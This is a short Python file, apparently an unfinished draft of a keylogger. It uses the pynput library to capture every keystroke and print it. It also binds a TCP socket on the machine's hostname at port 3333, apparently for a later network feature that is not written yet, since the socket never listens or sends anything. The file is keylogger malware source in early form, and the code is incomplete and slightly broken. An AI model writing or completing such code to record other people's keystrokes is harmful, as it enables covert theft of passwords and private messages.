from pynput import keyboard
import socket
import threading
#Remember to uninstall pynobjc

#Socket
#Automatically retrieves IP Address of user
IP = socket.gethostname()

port = 3333
ADDR = (IP, port)

#Anything which hits the address (ADDR) will hit the socket specified within the server variable
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

#Keylogger
def key_pressed(key): 
    print(str(key))

if __name__ == "__main__":
    listener = keyboard.Listener(on_press = key_pressed)
    listener.start()
    words = "PLACEHOLDER"
    while words != " false":
        words = input()
        print("Called")